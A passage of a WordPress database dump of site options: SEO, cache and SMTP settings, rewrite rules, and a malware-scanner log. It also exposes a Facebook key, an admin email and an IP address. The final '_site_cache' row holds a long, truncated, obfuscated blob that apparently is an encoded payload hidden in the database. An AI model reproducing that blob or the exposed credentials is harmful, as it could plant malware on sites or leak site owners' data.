%%sitename%%\";s:24:\"metadesc-tax-post_format\";s:0:\"\";s:23:\"metakey-tax-post_format\";s:0:\"\";s:27:\"hideeditbox-tax-post_format\";b:0;s:23:\"noindex-tax-post_format\";b:0;s:28:\"title-tax-portfolio_category\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:31:\"metadesc-tax-portfolio_category\";s:0:\"\";s:30:\"metakey-tax-portfolio_category\";s:0:\"\";s:34:\"hideeditbox-tax-portfolio_category\";b:0;s:30:\"noindex-tax-portfolio_category\";b:0;s:23:\"title-tax-portfolio_tag\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:26:\"metadesc-tax-portfolio_tag\";s:0:\"\";s:25:\"metakey-tax-portfolio_tag\";s:0:\"\";s:29:\"hideeditbox-tax-portfolio_tag\";b:0;s:25:\"noindex-tax-portfolio_tag\";b:0;s:14:\"title-category\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:14:\"title-post_tag\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:17:\"title-post_format\";s:53:\"%%term_title%% Archives %%page%% %%sep%% %%sitename%%\";s:19:\"noindex-post_format\";b:1;}","yes");
INSERT INTO `cmrfu_options` VALUES("182","wpseo_xml","a:21:{s:22:\"disable_author_sitemap\";b:0;s:22:\"disable_author_noposts\";b:1;s:16:\"enablexmlsitemap\";b:1;s:16:\"entries-per-page\";i:1000;s:14:\"xml_ping_yahoo\";b:1;s:12:\"xml_ping_ask\";b:1;s:38:\"user_role-administrator-not_in_sitemap\";b:0;s:31:\"user_role-editor-not_in_sitemap\";b:0;s:31:\"user_role-author-not_in_sitemap\";b:0;s:36:\"user_role-contributor-not_in_sitemap\";b:0;s:35:\"user_role-subscriber-not_in_sitemap\";b:0;s:30:\"post_types-post-not_in_sitemap\";b:0;s:30:\"post_types-page-not_in_sitemap\";b:0;s:36:\"post_types-attachment-not_in_sitemap\";b:0;s:34:\"taxonomies-category-not_in_sitemap\";b:0;s:34:\"taxonomies-post_tag-not_in_sitemap\";b:0;s:37:\"taxonomies-post_format-not_in_sitemap\";b:0;s:44:\"taxonomies-portfolio_category-not_in_sitemap\";b:0;s:39:\"taxonomies-portfolio_tag-not_in_sitemap\";b:0;s:35:\"post_types-portfolio-not_in_sitemap\";b:0;s:32:\"post_types-slider-not_in_sitemap\";b:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("183","wpseo_social","a:14:{s:9:\"fb_admins\";a:0:{}s:6:\"fbapps\";a:0:{}s:12:\"fbconnectkey\";s:32:\"b7b67b1ca5c1754082830a94ae12f4fb\";s:13:\"facebook_site\";s:0:\"\";s:16:\"og_default_image\";s:0:\"\";s:17:\"og_frontpage_desc\";s:0:\"\";s:18:\"og_frontpage_image\";s:0:\"\";s:9:\"opengraph\";b:1;s:10:\"googleplus\";b:0;s:14:\"plus-publisher\";s:0:\"\";s:7:\"twitter\";b:0;s:12:\"twitter_site\";s:0:\"\";s:17:\"twitter_card_type\";s:7:\"summary\";s:10:\"fbadminapp\";i:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("184","wpseo_rss","a:1:{s:8:\"rssafter\";s:53:\"The post %%POSTLINK%% appeared first on %%BLOGLINK%%.\";}","yes");
INSERT INTO `cmrfu_options` VALUES("185","wpseo_permalinks","a:10:{s:15:\"cleanpermalinks\";b:0;s:24:\"cleanpermalink-extravars\";s:0:\"\";s:29:\"cleanpermalink-googlecampaign\";b:0;s:31:\"cleanpermalink-googlesitesearch\";b:0;s:15:\"cleanreplytocom\";b:0;s:10:\"cleanslugs\";b:1;s:15:\"force_transport\";s:7:\"default\";s:18:\"redirectattachment\";b:0;s:17:\"stripcategorybase\";b:0;s:13:\"trailingslash\";b:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("125","recently_activated","a:0:{}","yes");
INSERT INTO `cmrfu_options` VALUES("210","category_children","a:0:{}","yes");
INSERT INTO `cmrfu_options` VALUES("133","underConstructionRequiredRole","0","yes");
INSERT INTO `cmrfu_options` VALUES("135","_transient_twentyfourteen_category_count","1","yes");
INSERT INTO `cmrfu_options` VALUES("1183","supercache_stats","a:3:{s:9:\"generated\";i:1412589790;s:10:\"supercache\";a:5:{s:7:\"expired\";i:0;s:12:\"expired_list\";a:0:{}s:6:\"cached\";i:0;s:11:\"cached_list\";a:0:{}s:2:\"ts\";i:1412589790;}s:7:\"wpcache\";a:3:{s:6:\"cached\";i:0;s:7:\"expired\";i:0;s:5:\"fsize\";s:3:\"0KB\";}}","yes");
INSERT INTO `cmrfu_options` VALUES("139","_transient_random_seed","a501c313952892e4f7d6fa79c4896f64","yes");
INSERT INTO `cmrfu_options` VALUES("227","nav_menu_options","a:2:{i:0;b:0;s:8:\"auto_add\";a:0:{}}","yes");
INSERT INTO `cmrfu_options` VALUES("190","ossdl_cname","","yes");
INSERT INTO `cmrfu_options` VALUES("193","wpcf7","a:1:{s:7:\"version\";s:3:\"4.7\";}","yes");
INSERT INTO `cmrfu_options` VALUES("194","wpsupercache_start","1392830877","yes");
INSERT INTO `cmrfu_options` VALUES("195","wpsupercache_count","0","yes");
INSERT INTO `cmrfu_options` VALUES("196","ossdl_https","0","yes");
INSERT INTO `cmrfu_options` VALUES("1138","wpseo_internallinks","a:10:{s:20:\"breadcrumbs-404crumb\";s:0:\"\";s:23:\"breadcrumbs-blog-remove\";b:0;s:20:\"breadcrumbs-boldlast\";b:0;s:25:\"breadcrumbs-archiveprefix\";s:0:\"\";s:18:\"breadcrumbs-enable\";b:0;s:16:\"breadcrumbs-home\";s:0:\"\";s:18:\"breadcrumbs-prefix\";s:0:\"\";s:24:\"breadcrumbs-searchprefix\";s:0:\"\";s:15:\"breadcrumbs-sep\";s:7:\"&raquo;\";s:23:\"post_types-post-maintax\";i:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("1182","wpsupercache_gc_time","1409345334","yes");
INSERT INTO `cmrfu_options` VALUES("656","db_upgraded","","yes");
INSERT INTO `cmrfu_options` VALUES("2710","mail_from","info@herkonyapi.com","yes");
INSERT INTO `cmrfu_options` VALUES("269","ld_http_auth","none","yes");
INSERT INTO `cmrfu_options` VALUES("270","ld_hide_wp_admin","yep","yes");
INSERT INTO `cmrfu_options` VALUES("271","ld_login_base","yonetim","yes");
INSERT INTO `cmrfu_options` VALUES("623","auto_core_update_notified","a:4:{s:4:\"type\";s:6:\"manual\";s:5:\"email\";s:19:\"info@herkonyapi.com\";s:7:\"version\";s:5:\"4.7.1\";s:9:\"timestamp\";i:1484652099;}","no");
INSERT INTO `cmrfu_options` VALUES("15439","rewrite_rules","a:147:{s:19:\"sitemap_index\\.xml$\";s:19:\"index.php?sitemap=1\";s:31:\"([^/]+?)-sitemap([0-9]+)?\\.xml$\";s:51:\"index.php?sitemap=$matches[1]&sitemap_n=$matches[2]\";s:24:\"([a-z]+)?-?sitemap\\.xsl$\";s:25:\"index.php?xsl=$matches[1]\";s:11:\"^wp-json/?$\";s:22:\"index.php?rest_route=/\";s:14:\"^wp-json/(.*)?\";s:33:\"index.php?rest_route=/$matches[1]\";s:21:\"^index.php/wp-json/?$\";s:22:\"index.php?rest_route=/\";s:24:\"^index.php/wp-json/(.*)?\";s:33:\"index.php?rest_route=/$matches[1]\";s:17:\"portfolio-item/?$\";s:29:\"index.php?post_type=portfolio\";s:47:\"portfolio-item/feed/(feed|rdf|rss|rss2|atom)/?$\";s:46:\"index.php?post_type=portfolio&feed=$matches[1]\";s:42:\"portfolio-item/(feed|rdf|rss|rss2|atom)/?$\";s:46:\"index.php?post_type=portfolio&feed=$matches[1]\";s:34:\"portfolio-item/page/([0-9]{1,})/?$\";s:47:\"index.php?post_type=portfolio&paged=$matches[1]\";s:8:\"slide/?$\";s:26:\"index.php?post_type=slider\";s:38:\"slide/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?post_type=slider&feed=$matches[1]\";s:33:\"slide/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?post_type=slider&feed=$matches[1]\";s:25:\"slide/page/([0-9]{1,})/?$\";s:44:\"index.php?post_type=slider&paged=$matches[1]\";s:47:\"category/(.+?)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:42:\"category/(.+?)/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:23:\"category/(.+?)/embed/?$\";s:46:\"index.php?category_name=$matches[1]&embed=true\";s:35:\"category/(.+?)/page/?([0-9]{1,})/?$\";s:53:\"index.php?category_name=$matches[1]&paged=$matches[2]\";s:17:\"category/(.+?)/?$\";s:35:\"index.php?category_name=$matches[1]\";s:44:\"tag/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:39:\"tag/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:20:\"tag/([^/]+)/embed/?$\";s:36:\"index.php?tag=$matches[1]&embed=true\";s:32:\"tag/([^/]+)/page/?([0-9]{1,})/?$\";s:43:\"index.php?tag=$matches[1]&paged=$matches[2]\";s:14:\"tag/([^/]+)/?$\";s:25:\"index.php?tag=$matches[1]\";s:45:\"type/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:40:\"type/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:21:\"type/([^/]+)/embed/?$\";s:44:\"index.php?post_format=$matches[1]&embed=true\";s:33:\"type/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?post_format=$matches[1]&paged=$matches[2]\";s:15:\"type/([^/]+)/?$\";s:33:\"index.php?post_format=$matches[1]\";s:59:\"portfolio_category/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:57:\"index.php?portfolio_category=$matches[1]&feed=$matches[2]\";s:54:\"portfolio_category/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:57:\"index.php?portfolio_category=$matches[1]&feed=$matches[2]\";s:35:\"portfolio_category/([^/]+)/embed/?$\";s:51:\"index.php?portfolio_category=$matches[1]&embed=true\";s:47:\"portfolio_category/([^/]+)/page/?([0-9]{1,})/?$\";s:58:\"index.php?portfolio_category=$matches[1]&paged=$matches[2]\";s:29:\"portfolio_category/([^/]+)/?$\";s:40:\"index.php?portfolio_category=$matches[1]\";s:53:\"tag_category/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?portfolio_tag=$matches[1]&feed=$matches[2]\";s:48:\"tag_category/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?portfolio_tag=$matches[1]&feed=$matches[2]\";s:29:\"tag_category/([^/]+)/embed/?$\";s:46:\"index.php?portfolio_tag=$matches[1]&embed=true\";s:41:\"tag_category/([^/]+)/page/?([0-9]{1,})/?$\";s:53:\"index.php?portfolio_tag=$matches[1]&paged=$matches[2]\";s:23:\"tag_category/([^/]+)/?$\";s:35:\"index.php?portfolio_tag=$matches[1]\";s:42:\"portfolio-item/[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:52:\"portfolio-item/[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:72:\"portfolio-item/[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:67:\"portfolio-item/[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:67:\"portfolio-item/[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:48:\"portfolio-item/[^/]+/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:31:\"portfolio-item/([^/]+)/embed/?$\";s:42:\"index.php?portfolio=$matches[1]&embed=true\";s:35:\"portfolio-item/([^/]+)/trackback/?$\";s:36:\"index.php?portfolio=$matches[1]&tb=1\";s:55:\"portfolio-item/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:48:\"index.php?portfolio=$matches[1]&feed=$matches[2]\";s:50:\"portfolio-item/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:48:\"index.php?portfolio=$matches[1]&feed=$matches[2]\";s:43:\"portfolio-item/([^/]+)/page/?([0-9]{1,})/?$\";s:49:\"index.php?portfolio=$matches[1]&paged=$matches[2]\";s:50:\"portfolio-item/([^/]+)/comment-page-([0-9]{1,})/?$\";s:49:\"index.php?portfolio=$matches[1]&cpage=$matches[2]\";s:39:\"portfolio-item/([^/]+)(?:/([0-9]+))?/?$\";s:48:\"index.php?portfolio=$matches[1]&page=$matches[2]\";s:31:\"portfolio-item/[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:41:\"portfolio-item/[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:61:\"portfolio-item/[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:56:\"portfolio-item/[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:56:\"portfolio-item/[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:37:\"portfolio-item/[^/]+/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:33:\"slide/[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:43:\"slide/[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:63:\"slide/[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:58:\"slide/[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:58:\"slide/[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:39:\"slide/[^/]+/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:22:\"slide/([^/]+)/embed/?$\";s:39:\"index.php?slider=$matches[1]&embed=true\";s:26:\"slide/([^/]+)/trackback/?$\";s:33:\"index.php?slider=$matches[1]&tb=1\";s:46:\"slide/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:45:\"index.php?slider=$matches[1]&feed=$matches[2]\";s:41:\"slide/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:45:\"index.php?slider=$matches[1]&feed=$matches[2]\";s:34:\"slide/([^/]+)/page/?([0-9]{1,})/?$\";s:46:\"index.php?slider=$matches[1]&paged=$matches[2]\";s:41:\"slide/([^/]+)/comment-page-([0-9]{1,})/?$\";s:46:\"index.php?slider=$matches[1]&cpage=$matches[2]\";s:30:\"slide/([^/]+)(?:/([0-9]+))?/?$\";s:45:\"index.php?slider=$matches[1]&page=$matches[2]\";s:22:\"slide/[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:32:\"slide/[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:52:\"slide/[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:47:\"slide/[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:47:\"slide/[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:28:\"slide/[^/]+/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:12:\"robots\\.txt$\";s:18:\"index.php?robots=1\";s:48:\".*wp-(atom|rdf|rss|rss2|feed|commentsrss2)\\.php$\";s:18:\"index.php?feed=old\";s:20:\".*wp-app\\.php(/.*)?$\";s:19:\"index.php?error=403\";s:18:\".*wp-register.php$\";s:23:\"index.php?register=true\";s:32:\"feed/(feed|rdf|rss|rss2|atom)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:27:\"(feed|rdf|rss|rss2|atom)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:8:\"embed/?$\";s:21:\"index.php?&embed=true\";s:20:\"page/?([0-9]{1,})/?$\";s:28:\"index.php?&paged=$matches[1]\";s:27:\"comment-page-([0-9]{1,})/?$\";s:40:\"index.php?&page_id=524&cpage=$matches[1]\";s:41:\"comments/feed/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:36:\"comments/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:17:\"comments/embed/?$\";s:21:\"index.php?&embed=true\";s:44:\"search/(.+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:39:\"search/(.+)/(feed|rdf|rss|rss2|atom)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:20:\"search/(.+)/embed/?$\";s:34:\"index.php?s=$matches[1]&embed=true\";s:32:\"search/(.+)/page/?([0-9]{1,})/?$\";s:41:\"index.php?s=$matches[1]&paged=$matches[2]\";s:14:\"search/(.+)/?$\";s:23:\"index.php?s=$matches[1]\";s:47:\"author/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:42:\"author/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:23:\"author/([^/]+)/embed/?$\";s:44:\"index.php?author_name=$matches[1]&embed=true\";s:35:\"author/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?author_name=$matches[1]&paged=$matches[2]\";s:17:\"author/([^/]+)/?$\";s:33:\"index.php?author_name=$matches[1]\";s:69:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:64:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:45:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/embed/?$\";s:74:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&embed=true\";s:57:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:81:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&paged=$matches[4]\";s:39:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/?$\";s:63:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]\";s:56:\"([0-9]{4})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:51:\"([0-9]{4})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:32:\"([0-9]{4})/([0-9]{1,2})/embed/?$\";s:58:\"index.php?year=$matches[1]&monthnum=$matches[2]&embed=true\";s:44:\"([0-9]{4})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:65:\"index.php?year=$matches[1]&monthnum=$matches[2]&paged=$matches[3]\";s:26:\"([0-9]{4})/([0-9]{1,2})/?$\";s:47:\"index.php?year=$matches[1]&monthnum=$matches[2]\";s:43:\"([0-9]{4})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:38:\"([0-9]{4})/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:19:\"([0-9]{4})/embed/?$\";s:37:\"index.php?year=$matches[1]&embed=true\";s:31:\"([0-9]{4})/page/?([0-9]{1,})/?$\";s:44:\"index.php?year=$matches[1]&paged=$matches[2]\";s:13:\"([0-9]{4})/?$\";s:26:\"index.php?year=$matches[1]\";s:27:\".?.+?/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:37:\".?.+?/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:57:\".?.+?/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:33:\".?.+?/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:16:\"(.?.+?)/embed/?$\";s:41:\"index.php?pagename=$matches[1]&embed=true\";s:20:\"(.?.+?)/trackback/?$\";s:35:\"index.php?pagename=$matches[1]&tb=1\";s:40:\"(.?.+?)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:35:\"(.?.+?)/(feed|rdf|rss|rss2|atom)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:28:\"(.?.+?)/page/?([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&paged=$matches[2]\";s:35:\"(.?.+?)/comment-page-([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&cpage=$matches[2]\";s:24:\"(.?.+?)(?:/([0-9]+))?/?$\";s:47:\"index.php?pagename=$matches[1]&page=$matches[2]\";s:27:\"[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:37:\"[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:57:\"[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\"[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\"[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:33:\"[^/]+/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:16:\"([^/]+)/embed/?$\";s:37:\"index.php?name=$matches[1]&embed=true\";s:20:\"([^/]+)/trackback/?$\";s:31:\"index.php?name=$matches[1]&tb=1\";s:40:\"([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?name=$matches[1]&feed=$matches[2]\";s:35:\"([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?name=$matches[1]&feed=$matches[2]\";s:28:\"([^/]+)/page/?([0-9]{1,})/?$\";s:44:\"index.php?name=$matches[1]&paged=$matches[2]\";s:35:\"([^/]+)/comment-page-([0-9]{1,})/?$\";s:44:\"index.php?name=$matches[1]&cpage=$matches[2]\";s:24:\"([^/]+)(?:/([0-9]+))?/?$\";s:43:\"index.php?name=$matches[1]&page=$matches[2]\";s:16:\"[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:26:\"[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:46:\"[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:41:\"[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:41:\"[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:22:\"[^/]+/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";}","yes");
INSERT INTO `cmrfu_options` VALUES("1155","portfolio_category_children","a:1:{i:58;a:2:{i:0;i:59;i:1;i:60;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15769","GOTMLS_scan_log/176.233.124.87/1478819375.0658","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1478819375;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1037;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1478820412.410625;s:6:\"finish\";i:1478820412;}}","yes");
INSERT INTO `cmrfu_options` VALUES("2705","wp_smtp_options","a:9:{s:4:\"from\";s:0:\"\";s:8:\"fromname\";s:0:\"\";s:4:\"host\";s:0:\"\";s:10:\"smtpsecure\";s:0:\"\";s:4:\"port\";s:0:\"\";s:8:\"smtpauth\";s:3:\"yes\";s:8:\"username\";s:0:\"\";s:8:\"password\";s:0:\"\";s:10:\"deactivate\";s:0:\"\";}","yes");
INSERT INTO `cmrfu_options` VALUES("2712","mailer","smtp","yes");
INSERT INTO `cmrfu_options` VALUES("2713","mail_set_return_path","","yes");
INSERT INTO `cmrfu_options` VALUES("2714","smtp_host","smtp.yandex.ru","yes");
INSERT INTO `cmrfu_options` VALUES("2715","smtp_port","587","yes");
INSERT INTO `cmrfu_options` VALUES("2716","smtp_ssl","tls","yes");
INSERT INTO `cmrfu_options` VALUES("2717","smtp_auth","true","yes");
INSERT INTO `cmrfu_options` VALUES("15391","_site_cache","bBZBGRUcQkYQDVcCAllpRkQRREdESAENXRUWDBJVAwgEAzoQRRJBHEwWV1pXR29QF14ORAVCUwYJaxIXExYTDw9YA1hRGAkQVwBVCzlCQ0ZEFQoMVV0WWVITRFBLTBZUX04eRgsVTR9LA1JXQFZcXQBHTAdXD0IaFRZFQB1SVhQHWQRYUlRRHgVfCBcfRRQREx8AF0NKAAVfFU8fUQtcHxgfV0MKWw9MFwVcXh4fF0gKSRgFVw4WTEYYXBlDWhBOQVUASUdRV18UXglfRQcLCRZeFwBeSABKXQRCFh5DRldZWV5fBlsVQRcFXF4eHxdPFERMFlEYH1leCB9WQUJSAQdaDktQFl1EQRxCR0QVTQINQhQPUEEAB1oAGFJdCR9aRh8ZC28SQRgZQl1cThMNGBdaDwEQS148OEESFxNfUUJOEj56end/eSNrQkhHBxASQ2xZXgARHkRWAl5eEkYcBWxsdWMxD0xkV0QIE1xLWUxYTmhEGEJFX1RBGhNsdXgtLX8kYhJIRlUAWR0Xbl9eQhdUFxBYVws7QxNTV1scER4SGENEF14EVhFCbHB2fHtxJmhFBUsRAERGRm8eDQYeQh0WIVhGS1FCEhhBb3AtLC0tdD9EUEsWAUEVEWwbX1RAXUwYGV4SHDIzRhMTGRdASgZFQlkYBQBCbQ5CQ1pZWUpEaRJQQV1rAEQZXjoTQkNGDVdES0JMFwhWDx4VQhZUTh0EDQBMSUVISwNFDgkITTJDE0JEUQRFHhYPXUAeEkcQA0BfHUBIUFkIREw6E0JDRh87bUdfVwEBE1wWFVwLVV1HY0JfEFwFEEsHXVcRAxxbDEYMEBBGC1lWBEEeHgceSzsNazBcXhQYE0ABUUcHPAkURQ0MXxBHO0AIQlRtVBMUEFZfR0wSRx4ZQl1cXVYRBUdsMSFqNCBkaUZ6Y2dmaCo